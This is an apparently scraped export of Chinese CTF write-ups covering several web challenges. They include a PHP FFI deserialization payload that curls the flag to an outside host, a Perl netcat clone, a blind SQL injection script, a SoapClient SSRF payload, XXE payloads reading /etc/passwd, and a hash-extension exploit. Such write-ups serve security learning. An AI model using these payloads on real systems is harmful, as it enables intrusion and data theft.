&#125;&#125;$a=new A();print(base64_encode(serialize($a)).&quot;\\n&quot;);print(serialize($a));?&gt; 然后访问/?a=unserialize(base64_decode(%22QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319%22))-%3E__get(%27ret%27)-%3Esystem(%22ls%22);](http://a899b5e3-3096-4f14-b6d0-8d4a282bcfc5.node2.buuoj.cn.wetolink.com:82/?a=unserialize(base64_decode(\"QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319\"))-&gt;__get('ret')-&gt;system(\"ls\");)，注意__get('ret')是必要的，因为FFI::cdef()返回的对象保存在data['ret']中。注意到没有回显，因为system会把输出放在STDOUT中，PHP没法接收到，那么我们可以将其发送到VPS中。http://a66c3418-bd96-47dd-aae4-e3904e2835ff.node2.buuoj.cn.wetolink.com:82/?a=unserialize(base64_decode(\"QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319\"))-&gt;__get('ret')-&gt;system('curl http://172.2.0.8:5277 -d \"abc=\\cat /flag`\"');`，由于BUUOJ的限制，我们只能另开一台Linux靶机，然后借助这个向外传递结果了。在Linux靶机上监听5277端口，就能收到flag了。 P.S. BUUOJ上的Linux靶机没有nc，我们用Perl写了个Perlcat。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142#!/usr/bin/perluse strict;use warnings;use IO::Socket;# subroutinessub argerr($)&#123; print STDERR &quot;ERROR: &quot;.$_[0].&quot;\\n&quot;; usage();&#125;sub usage()&#123; print STDERR &quot;Usage: $0 [OPTIONS] [DESTINATION IP] PORT\\n&quot;; print STDERR &quot;Options:\\n&quot;; print STDERR &quot; -l Open and listen TCP port\\n&quot;; print STDERR &quot; -p [PORT] TCP port\\n&quot;; print STDERR &quot; -v Verbose\\n&quot;; exit 1;&#125;# mainmy $addr;my $port=9001;my $listen=0;my $verbose=0;# parse arguments...# print usage if no argumentsif($#ARGV == -1)&#123; argerr(&quot;No arguments!&quot;);&#125;# search for help argumentfor(0..$#ARGV)&#123; if($ARGV[$_] =~ m/--help/ || $ARGV[$_] =~ m/-h/) &#123; usage(); &#125;&#125;# get optionsmy $readport=0;my $readexec=0;for(0..$#ARGV)&#123; if($ARGV[$_] =~ m/^-[a-zA-Z]+/ &amp;&amp; $readport == 0)&#123; my $opts = $ARGV[$_]; $opts =~ s/^.//; foreach(split(&#x27;&#x27;, $opts))&#123; if($_ eq &quot;l&quot;)&#123; $listen=1; &#125; elsif($_ eq &quot;p&quot;)&#123; $readport=1; &#125; elsif($_ eq &quot;v&quot;)&#123; $verbose=1; &#125; &#125; &#125; elsif($readport == 1)&#123; $readport=0; if($ARGV[$_] !~ m/^\\d+$/)&#123; argerr(&quot;PORT syntax error!&quot;); &#125; $port = $ARGV[$_]; &#125;&#125;my $socket;my $connection; # mode of operationif($listen == 0)&#123; # search for an IPv4 number followed by a port number if($ARGV[$#ARGV-1] =~ m/^\\d+.\\d+.\\d+.\\d+$/ &amp;&amp; $ARGV[$#ARGV] =~ m/^\\d+$/)&#123; $addr = $ARGV[$#ARGV-1]; $port = $ARGV[$#ARGV]; &#125; if(!defined $addr) &#123;argerr(&quot;IP and PORT syntax error!&quot;);&#125; if(!defined $port) &#123;argerr(&quot;IP and PORT syntax error!&quot;);&#125; if($addr !~ m/^\\d+.\\d+.\\d+.\\d+$/ || $port !~ m/^\\d+$/)&#123; argerr(&quot;IP and PORT syntax error!&quot;); &#125; # create socket interface $socket = new IO::Socket::INET( Proto =&gt; &#x27;tcp&#x27;, PeerAddr =&gt; $addr, PeerPort =&gt; $port, Reuse =&gt; 1, Timeout =&gt; 10); die &quot;Could not create socket: $!\\n&quot; unless $socket; $connection = $socket;&#125;else &#123; # listen on port if($verbose)&#123; print STDERR &quot;Listening on port &quot;. $port .&quot;...\\n&quot;; &#125; # create socket interface $socket = new IO::Socket::INET ( LocalPort =&gt; $port, Proto =&gt; &#x27;tcp&#x27;, Listen =&gt; 1, Reuse =&gt; 1,); die &quot;Could not create socket: $!\\n&quot; unless $socket; # accept client connection my $client = $socket-&gt;accept(); if($verbose)&#123; print STDERR &quot;Connection from &quot;. $client-&gt;peerhost() .&quot;\\n&quot;; &#125; $connection = $client;&#125;# fork writerdie &quot;Can&#x27;t fork writer: $!&quot; unless defined(my $writepid = fork());# split the forkif ($writepid) &#123; # copy the socket to standard output my $buffer; while($connection-&gt;read($buffer,1))&#123; syswrite(STDOUT,$buffer,1); &#125; # SIGTERM to writer kill(&quot;TERM&quot;, $writepid);&#125;else &#123; # copy standard input to the socket my $buffer; while(sysread(STDIN, $buffer, 1))&#123; $connection-&gt;write($buffer); &#125;&#125;# close socket interfaceclose($socket);exit 0; flag{1fac1f87-62e0-44b7-9469-0f0fa01ea549}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"FFI","slug":"FFI","permalink":"http://tiaonmmn.github.io/tags/FFI/"}]},{"title":"BUUOJ刷题-Web-shellshellshell","slug":"BUUOJ刷题-Web-shellshellshell","date":"2019-09-17T11:03:00.000Z","updated":"2019-12-10T12:15:12.603Z","comments":true,"path":"2019/09/17/BUUOJ刷题-Web-shellshellshell/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/","excerpt":"De1CTF 2019的Shellshellshell。 扫目录发现有index.php~文件，然后猜测一下其他文件也有，然后我们就Down下了完整源码。","text":"De1CTF 2019的Shellshellshell。 扫目录发现有index.php~文件，然后猜测一下其他文件也有，然后我们就Down下了完整源码。 # Part 1. SQL Injection 看一下源码，发现在user.php里的publish()有个奇怪的insert: 12345678910111213141516function publish() &#123; if(!$this-&gt;check_login()) return false; if($this-&gt;is_admin == 0) &#123; if(isset($_POST[&#x27;signature&#x27;]) &amp;&amp; isset($_POST[&#x27;mood&#x27;])) &#123; $mood = addslashes(serialize(new Mood((int)$_POST[&#x27;mood&#x27;],get_ip()))); $db = new Db(); @$ret = $db-&gt;insert(array(&#x27;userid&#x27;,&#x27;username&#x27;,&#x27;signature&#x27;,&#x27;mood&#x27;),&#x27;ctf_user_signature&#x27;,array($this-&gt;userid,$this-&gt;username,$_POST[&#x27;signature&#x27;],$mood)); if($ret) return true; else return false; &#125; &#125; 直接带入\\(\\_POST[&#39;signature&#39;]，那么来看一下\\)db-&gt;insert的实现。 12345678910111213141516171819 private function get_column($columns)&#123; if(is_array($columns)) $column = &#x27; `&#x27;.implode(&#x27;`,`&#x27;,$columns).&#x27;` &#x27;; else $column = &#x27; `&#x27;.$columns.&#x27;` &#x27;; return $column;&#125;public function insert($columns,$table,$values)&#123; $column = $this-&gt;get_column($columns); $value = &#x27;(&#x27;.preg_replace(&#x27;/`([^`,]+)`/&#x27;,&#x27;\\&#x27;$&#123;1&#125;\\&#x27;&#x27;,$this-&gt;get_column($values)).&#x27;)&#x27;; $nid = $sql = &#x27;insert into &#x27;.$table.&#x27;(&#x27;.$column.&#x27;) values &#x27;.$value; $result = $this-&gt;conn-&gt;query($sql); return $result;&#125; \\(column通过get_column()获得，将传入的\\)columns组成用反引号包裹的字符串，如：`\\(columns[0],\\`\\)columns[1]`，重点是\\(value，preg_replace的正则意思是如果原\\)value不存在`或,，就将反引号包裹的$value转成单引号包裹。效果如下图： 这样就会对SQL注入带来麻烦，如\\(values=array(&quot;admin&quot;,&quot;test&#39; or 1=1,3#&quot;);，过get_column()处理后变成&quot;\\`admin\\`,\\`test&#39; or 1=1,3#\\`&quot;，再过preg_replace后变成&quot;&#39;admin&#39;,\\`test&#39; or 1=1,3#\\`&quot;。在逗号之前没出现另一个反引号，造成test前的反引号没有配对，无法转换，保留下来，造成实际执行的SQL语句不合法。那么我们如果在其中插入反引号会怎样？\\)values=array(\"admin\",\"`test' or 1=1,3#\");过get_column()处理变成\"`admin`,``test' or 1=1,3#`\"，过preg_replace变成\"'admin',``test' or 1=1,3#`\"，还是不对。那么换个位置怎样？$values=array(\"admin\",\"test`' or 1=1,3#\");过get_column()变成\"`admin`,`test`' or 1=1,3#`\"，再过preg_replace变成\"'admin','test'' or 1=1,3#`\"，好了我们逃逸出来一个单引号，那就够了。 上文提到的user.php中的publish()允许我们用POST提交signature，条件满足，写脚本吧。这是个insert类型注入，用sleep盲注。注入的数据大概为324`,3),((if(ascii(substring((select database()),1))=102,sleep(5),1)),1,2,3)#，带入SQL就变成了 insert into ctf_user_signature( `userid`,`username`,`signature`,`mood` ) values ( '1','test','324',3),((if(ascii(substring((select database()),1))=102,sleep(5),1)),1,2,3)#`,'O:4:\\\"Mood\\\":3:&#123;s:4:\\\"mood\\\";i:1;s:2:\\\"ip\\\";s:11:\\\"192.168.1.4\\\";s:4:\\\"date\\\";i:1568730153;&#125;' ) 123456789101112131415161718192021222324252627import timeimport stringimport requestsheader = &#123; &quot;Cookie&quot;: &quot;PHPSESSID=2hl10o0f976664asa88vkcoeq6&quot;&#125;url = &quot;http://62614c8b-c370-493c-bb6f-1087ddf417bc.node1.buuoj.cn/index.php?action=publish&quot;result = &quot;&quot;for a in range(1, 32): for b in (string.ascii_lowercase+string.digits): data = &#123; &quot;signature&quot;: &quot;324`,3),((if(ascii(substring((select password from ctf_users where username=0x61646d696e),&#123;0&#125;,1))=&#123;1&#125;,sleep(15),1)),1,2,3)#&quot;.format(a, ord(b)), &quot;mood&quot;: 1 &#125; try: time.sleep(1) x = requests.post(url=url, headers=header, data=data, timeout=13) print(data) x.close() except requests.exceptions.Timeout: result += b break time.sleep(5) print(result) 我们已知用户名为admin，直接从ctf_users表读密码并且password一定是MD5可以限定字符集，由于网络问题可能出现错误，多试几次。得到MD5：c991707fdf339958eded91331fb11ba0，解得jaivypassword。 Part 2. SoapClient SSRF 但是我们直接登录后发现不允许我们登录。提示：You can only login at the usual address。回去翻源码。用的get_ip()返回$_SERVER['REMOTE_ADDR']，这个没法绕过。我们需要能本地访问的方法，要么绕过REMOTE_ADDR，要么找到一处SSRF，登录后返回Cookie，我们再用Cookie登录。 然后注意到publish()还有一处奇怪的地方：$mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));。可以序列化，当前代码里没有任何有关SSRF的类，那么就要考虑PHP本地类了。这里参考N1CTF 2018 Easy&amp;&amp;Hard PHP，使用SoapClient。 12345678910111213141516&lt;?php$headers = array( &#x27;Cookie: PHPSESSID=8qpm643062ib88mnqerme74kl4&#x27; #我们先访问login页面分配一个Cookie，同时爆破得到验证码);$target = &#x27;http://a0d22f20-788f-4ba7-9960-cc8ee356962c.node1.buuoj.cn/index.php?action=login&#x27;;$post_string = &#x27;username=admin&amp;password=jaivypassword&amp;code=267234&#x27;;#刚才爆破得到的验证码$b = new SoapClient(null, array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &#x27;wupco^^Content-Type:application/x-www-form-urlencoded^^&#x27; . join(&#x27;^^&#x27;, $headers) . &#x27;^^Content-Length:&#x27; . (string)strlen($post_string) . &#x27;^^^^&#x27; . $post_string, &#x27;uri&#x27; =&gt; &quot;aaab&quot;));//因为user-agent是可以控制的，因此可以利用crlf注入http头来发送post请求$aaa = serialize($b);$aaa = str_replace(&#x27;^^&#x27;, &#x27;%0d%0a&#x27;, $aaa);$aaa = str_replace(&#x27;&amp;&#x27;, &#x27;%26&#x27;, $aaa);echo $aaa;?&gt; 得到结果O:10:\"SoapClient\":4:{s:3:\"uri\";s:4:\"aaab\";s:8:\"location\";s:81:\"http://a0d22f20-788f-4ba7-9960-cc8ee356962c.node1.buuoj.cn/index.php?action=login\";s:11:\"_user_agent\";s:171:\"wupco%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aCookie: PHPSESSID=8qpm643062ib88mnqerme74kl4%0d%0aContent-Length:49%0d%0a%0d%0ausername=admin%26password=jaivypassword%26code=267234\";s:13:\"_soap_version\";i:1;} 下面的问题是我们的$_POST['Mood']被转成int处理了，没法注入进去。然后我们发现user.php中showmess()会将数据库中的Mood读出来： 1234567891011121314151617181920212223242526function showmess() &#123; if(!$this-&gt;check_login()) return false; if($this-&gt;is_admin == 0) &#123; //id,sig,mood,ip,country,subtime $db = new Db(); @$ret = $db-&gt;select(array(&#x27;username&#x27;,&#x27;signature&#x27;,&#x27;mood&#x27;,&#x27;id&#x27;),&#x27;ctf_user_signature&#x27;,&quot;userid = $this-&gt;userid order by id desc&quot;); if($ret) &#123; $data = array(); while ($row = $ret-&gt;fetch_row()) &#123; $sig = $row[1]; $mood = unserialize($row[2]); $country = $mood-&gt;getcountry(); $ip = $mood-&gt;ip; $subtime = $mood-&gt;getsubtime(); $allmess = array(&#x27;id&#x27;=&gt;$row[3],&#x27;sig&#x27; =&gt; $sig, &#x27;mood&#x27; =&gt; $mood, &#x27;ip&#x27; =&gt; $ip, &#x27;country&#x27; =&gt; $country, &#x27;subtime&#x27; =&gt; $subtime); array_push($data, $allmess); &#125; $data = json_encode(array(&#x27;code&#x27;=&gt;0,&#x27;data&#x27;=&gt;$data)); return $data; &#125; else return false; &#125; 我们就不必考虑绕过int转换了，在刚才的SQL注入那里我们可以插入一个Mood，所以我们的Payload为： 1234567891011121314&lt;?php$target = &#x27;http://127.0.0.1/index.php?action=login&#x27;;# 一定得是127.0.0.1，SSRF要从本地访问$headers = array( &#x27;Cookie: PHPSESSID=kvvs649604t498pgc5sp936oa5&#x27;# 重新分配一个未登陆的Cookie，提前爆破好验证码);$post_string = &#x27;username=admin&amp;password=jaivypassword&amp;code=497567&#x27;; #code为刚才爆破好的$b = new SoapClient(null, array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27; . join(&#x27;^^&#x27;, $headers) . &#x27;^^Content-Length: &#x27; . (string)strlen($post_string) . &#x27;^^^^&#x27; . $post_string, &#x27;uri&#x27; =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#x27;^^&#x27;, &quot;\\r\\n&quot;, $aaa);$aaa = str_replace(&#x27;&amp;&#x27;, &#x27;&amp;&#x27;, $aaa);#&amp;字符不能改变echo bin2hex($aaa);?&gt; 然后新建一个用户，正常登陆，在publish的时候提交signature=q3e13`,0x4f3a31303a22536f6170436c69656e74223a343a7b733a333a22757269223b733a343a2261616162223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31313a225f757365725f6167656e74223b733a3137333a22777570636f0d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6f6b69653a205048505345535349443d6b767673363439363034743439387067633573703933366f61350d0a436f6e74656e742d4c656e6774683a2034390d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6a6169767970617373776f726426636f64653d343937353637223b733a31333a225f736f61705f76657273696f6e223b693a313b7d)%23&mood=1一大串16进制字符为刚才Payload的结果。然后访问一下index.php，会返回500，我们的目的已经达到了。 用Payload中的Cookie登陆，就进入admin了。 publish页面变为上传了，我们可以上传任意的文件，没有做任何限制。我们上传个一句话然后AntSword连接。 Part 3. Internat Exploit 扫一下IP，在.7那里有一个index.php文件，拖回来看一下： 1234567891011121314151617181920212223242526272829&lt;?php$sandbox = &#x27;/var/sandbox/&#x27; . md5(&quot;prefix&quot; . $_SERVER[&#x27;REMOTE_ADDR&#x27;]);@mkdir($sandbox);@chdir($sandbox);if($_FILES[&#x27;file&#x27;][&#x27;name&#x27;])&#123; $filename = !empty($_POST[&#x27;file&#x27;]) ? $_POST[&#x27;file&#x27;] : $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; if (!is_array($filename)) &#123; $filename = explode(&#x27;.&#x27;, $filename); &#125; $ext = end($filename); if($ext==$filename[count($filename) - 1])&#123; die(&quot;try again!!!&quot;); &#125; $new_name = (string)rand(100,999).&quot;.&quot;.$ext; move_uploaded_file([&#x27;file&#x27;][&#x27;tmp_name&#x27;],$new_name); $_ = $_POST[&#x27;hello&#x27;]; if(@substr(file($_)[0],0,6)===&#x27;@&lt;?php&#x27;)&#123; if(strpos($_,$new_name)===false) &#123; include($_); &#125; else &#123; echo &quot;you can do it!&quot;; &#125; &#125; unlink($new_name);&#125;else&#123; highlight_file(__FILE__);&#125; 老题了，如果\\(ext==\\)filename[count($filename) - 1]，die()，\\(filename可以直接传入，因此我们可以传个file[0]与file[1]，问题在于end()，end()返回数组最后一个元素，但并不是按照数组索引的顺序排列的，而是按照赋值顺序。也就是说我们传入file[1]=aaa,file[0]=bbb，文件名为bbb.aaa，end()返回的是bbb，第一个die就可以绕过了。然后是将传入的文件重命名成000-999之间随机的数字+\\)ext。然后unlink()删除，unlink()是可以绕过的。如果unlink传入的文件名带有路径字符，就会失败。如传入\"aaa.php/.\"，move_uploaded_file()会将文件名正规化处理，删掉不必要的字符，结果/.被删除，但是unlink()无法处理路径，直接返回失败，导致文件被保留。 最后一个问题，我们没办法直接访问到shell，要通过POST的Hello访问，因此我们的Shell要以@","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"盲注","slug":"盲注","permalink":"http://tiaonmmn.github.io/tags/%E7%9B%B2%E6%B3%A8/"},{"name":"SSRF","slug":"SSRF","permalink":"http://tiaonmmn.github.io/tags/SSRF/"},{"name":"SoapClient","slug":"SoapClient","permalink":"http://tiaonmmn.github.io/tags/SoapClient/"},{"name":"Slepp","slug":"Slepp","permalink":"http://tiaonmmn.github.io/tags/Slepp/"}]},{"title":"CSAW Quals 2019 Unagi","slug":"CSAW-Quals-2019-Unagi","date":"2019-09-17T03:30:59.000Z","updated":"2019-12-10T12:15:12.610Z","comments":true,"path":"2019/09/17/CSAW-Quals-2019-Unagi/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/17/CSAW-Quals-2019-Unagi/","excerpt":"CSAWCTF Quals 2019的Unagi，XXE题目。 打开后允许我们上传XML文件，并且给出了示例XML。","text":"CSAWCTF Quals 2019的Unagi，XXE题目。 打开后允许我们上传XML文件，并且给出了示例XML。 1234567891011121314151617&lt;?xml version=&#x27;1.0&#x27;?&gt;&lt;users&gt; &lt;user&gt; &lt;username&gt;alice&lt;/username&gt; &lt;password&gt;passwd1&lt;/password&gt; &lt;name&gt;Alice&lt;/name&gt; &lt;email&gt;alice@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;/user&gt; &lt;user&gt; &lt;username&gt;bob&lt;/username&gt; &lt;password&gt;passwd2&lt;/password&gt; &lt;name&gt; Bob&lt;/name&gt; &lt;email&gt;bob@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;/user&gt;&lt;/users&gt; 很明显的在考XXE，我们直接套用Payload就行。 123456789101112131415161718&lt;?xml version=&#x27;1.0&#x27;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#x27;file:///etc/passwd&#x27;&gt;]&gt;&lt;users&gt; &lt;user&gt; &lt;username&gt;alice&lt;/username&gt; &lt;password&gt;passwd1&lt;/password&gt; &lt;name&gt;Alice&lt;/name&gt; &lt;email&gt;alice@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;/user&gt; &lt;user&gt; &lt;username&gt;bob&lt;/username&gt; &lt;password&gt;passwd2&lt;/password&gt; &lt;name&gt; Bob&lt;/name&gt; &lt;email&gt;bob@fakesite.com&lt;/email&gt; &lt;group&gt;&amp;test;&lt;/group&gt; &lt;/user&gt;&lt;/users&gt; 然后我们发现，放在user或者group标签下最多显示15位字符，然后我们看一下User页面，发现其实还存在一个Intro标签。我们改一下Payload: 12345678910111213141516171819&lt;?xml version=&#x27;1.0&#x27;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#x27;file:///etc/passwd&#x27;&gt;]&gt;&lt;users&gt; &lt;user&gt; &lt;username&gt;alice&lt;/username&gt; &lt;password&gt;passwd1&lt;/password&gt; &lt;name&gt;Alice&lt;/name&gt; &lt;email&gt;alice@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;/user&gt; &lt;user&gt; &lt;username&gt;bob&lt;/username&gt; &lt;password&gt;passwd2&lt;/password&gt; &lt;name&gt; Bob&lt;/name&gt; &lt;email&gt;bob@fakesite.com&lt;/email&gt; &lt;group&gt;&amp;test;&lt;/group&gt; &lt;intro&gt;&amp;test;&lt;/intro&gt; &lt;/user&gt;&lt;/users&gt; 提交给upload.php发现有WAF，不允许出现file关键词。参考这个，我们上传XML的时候可以采用UTF-8和UTF-16两种编码格式。默认的WAF不会处理UTF-16的字符。那么我们试一下更改文件编码。用iconv工具即可。cat sample.xml|iconv -f UTF-8 -t UTF-16BE &gt; payload.xml然后提交，发现确实读到/etc/passwd文件了。然后我们来读一下/flag，发现返回空。file://协议不行，我们试一下php://filter，把file:///flag改为php://filter/convert.base64-encode/resource=/../../../flag，得到Base64编码的Flag，处理一下就可以了。 flag{9d04beb3-6aff-47f3-aac1-2709d91ac364}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"XXE","slug":"XXE","permalink":"http://tiaonmmn.github.io/tags/XXE/"}]},{"title":"SWPUCTF-2016-Web400","slug":"SWPUCTF-2016-Web400","date":"2019-09-13T09:11:40.000Z","updated":"2019-12-10T12:15:12.675Z","comments":true,"path":"2019/09/13/SWPUCTF-2016-Web400/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/13/SWPUCTF-2016-Web400/","excerpt":"SWPUCTF 2016的Web400。 是个PHP的博客系统，扫目录发现了一个web.zip。好了，源码审计。 先看一下index.php，发现实现的注册与登录都没有进行任何SQL过滤，但不知道有什么用。common.php是公共引用的文件，其中有我们十分感兴趣的代码。","text":"SWPUCTF 2016的Web400。 是个PHP的博客系统，扫目录发现了一个web.zip。好了，源码审计。 先看一下index.php，发现实现的注册与登录都没有进行任何SQL过滤，但不知道有什么用。common.php是公共引用的文件，其中有我们十分感兴趣的代码。 123456789foreach (Array(&quot;_POST&quot;, &quot;_GET&quot;, &quot;_COOKIE&quot;) as $key) &#123; foreach ($$key as $k =&gt; $v) &#123; if (is_array($v)) &#123; die(&quot;hello,hacker!&quot;); &#125; else &#123; $k[0] != &#x27;_&#x27; ? $$k = addslashes($v) : $$k = &quot;&quot;; &#125; &#125;&#125; PHP中$$代表以某一变量名作为变量名的变量，因此foreach循环中的$$key as $k =&gt; \\(v，等同于将上面提到的Array(&quot;\\_POST&quot;, &quot;\\_GET&quot;, &quot;\\_COOKIE&quot;)这几个数组分别拆成\\)k和\\(v，其中\\)k指“_POST”等数组内元素的名字，\\(v指\\)k对应的值。如果\\(v是个数组则die，如果我们传入`/?c[]=1`，就会die。不是数组的话就会将\\)k数组的第一项addslashes()，就是说我们传入/?c=\"1\"，_GET数组的第一项就是c，那么实际上_GET['c']==_GET[0]的值是\\\"1\\\"。因此就有一个变量覆盖，我们可以任意对变量赋值。但是有个问题，这段代码在common.php中，其余所有文件是在文件头部include('common.php')的，我们的变量覆盖又只能控制数组的第一个变量，因此对于文件需要的传参，它实际上又会被覆盖掉，因此我们只能覆盖从未声明的变量。 然后在riji.php中我们有如下代码： 12345678910if ($_SESSION[&#x27;user&#x27;]) &#123; $username = $_SESSION[&#x27;user&#x27;]; @mysql_conn(); $sql = &quot;select * from user where name=&#x27;$username&#x27;&quot;; $result = @mysql_fetch_array(mysql_query($sql)); mysql_close(); if ($result[&#x27;userid&#x27;]) &#123; $id = intval($result[&#x27;userid&#x27;]); &#125;&#125; 我们正常登录后\\(\\_SESSION[&#39;user&#39;]会赋值\\)username，但如果登陆后此时我们把数据库中\\(username的记录删掉，那么if判断就会为false，\\)id没有被赋值，我们就可以控制了。 riji.php中还有一段代码： 12345678910111213&lt;?php @mysql_conn(); $sql1 = &quot;select * from msg where userid= $id order by id&quot;; $query = mysql_query($sql1); $result1 = array(); while ($temp = mysql_fetch_assoc($query)) &#123; $result1[] = $temp; &#125; mysql_close(); foreach ($result1 as $x =&gt; $o) &#123; echo display($o[&#x27;msg&#x27;]); &#125;?&gt; \\(id会直接带入查询，注意SQL语句中\\)id没有引号，那么我们传入1' or 1=1，全局addslashes()后变成1\\' or 1=1，addslashes()对于SQL注入没有任何影响。虽然不知道SQL注入有什么用。 然后api.php声明了一个admin类，其中确实有删除用户的方法。该文件最后两行直接\\(a=unserialize(base64_decode(\\)api))，然后do_method，\\(a与\\)api都没有后赋值，可以变量覆盖。但是在del_user之前我们要先过了check，check中检查类的check变量是否等于MD5（用户注册时的salt+类data变量+用户名），然后还检查用户的role是否为1。在源码中给出的db.sql中我们发现admin用户的role为1，但是我们不知道其salt。 然后在forget.php中我们看到如下代码： 12345678910111213141516171819if (@$forget == 1) &#123; @mysql_conn(); $sql = &quot;select * from user where name=&#x27;$username&#x27;&quot;; $result = @mysql_fetch_array(mysql_query($sql)); mysql_close(); if (!empty($result)) &#123; if ($result[&#x27;salt&#x27;]) &#123; $check = base64_encode(md5($result[&#x27;salt&#x27;])); $name = $result[&#x27;name&#x27;]; header(&quot;Location:/repass.php?username=$name&amp;check=$check&amp;mibao=$mibao&amp;pass=$pass&quot;); &#125; else &#123; echo(&quot;&lt;script&gt;alert(&#x27;Get salt Worng?&#x27;)&lt;/script&gt;&quot;); &#125; &#125; else &#123; echo(&quot;&lt;script&gt;alert(&#x27;Please check!!?&#x27;)&lt;/script&gt;&quot;); &#125;&#125; 我们输入用户名，查到有此用户后会带出来md5(salt)。 好了，现在我们已知md5(salt)，类data与用户名（admin）可控，要求md5(salt+data+\"admin\")，这就是哈希扩展攻击了。哈希扩展攻击参考这个，简单来说就是针对SHA、MD5这类Hash算法，如果我们不知道特定密文c，但是知道知道MD5/SHA(c+pad)与密文c的长度，其中pad我们可控，那么我们就可以求出MD5(salt+pad+m)，其中m为任意数据。 我们用这个工具，用于已知密文MD5，求MD5(密文+pad)的情况。 好了，可以开始反序列化了。 1234567891011121314&lt;?phpclass admin&#123; var $name=&quot;admin&quot;; var $check=&quot;0f85487590dd2a3182389623cc8e3933&quot;; var $data=&quot;admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;; var $method=&quot;del_msg&quot;; var $userid=2; var $msgid;//&gt;&gt;&gt; hashpumpy.hashpump(&#x27;ceb20772e0c9d240c75eb26b0e37abee&#x27;,&#x27;admin&#x27;,&#x27;admin&#x27;,16)//(&#x27;0f85487590dd2a3182389623cc8e3933&#x27;, b&#x27;admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00admin&#x27;)&#125;$a=serialize(new admin());echo base64_encode($a); userid置为2的原因是我们注册新用户的时候userid已经为2了，可以从Cookie中看到。 1234567891011121314151617181920212223242526if (@$login == 1) &#123; @mysql_conn(); $sql = &quot;select * from user where name=&#x27;$username&#x27;&quot;; $result = @mysql_fetch_array(mysql_query($sql)); mysql_close(); if (!empty($result)) &#123; if ($result[&#x27;passwd&#x27;] == md5($password)) &#123; $user_cookie = &#x27;&#x27;; $user_cookie .= $result[&#x27;userid&#x27;]; $user_cookie .= $result[&#x27;name&#x27;]; $user_cookie .= $result[&#x27;salt&#x27;]; $cookies = base64_encode($user_cookie); //$cookies = $user_cookie; setcookie(&quot;user&quot;, $cookies, time() + 60, &#x27;/&#x27;); 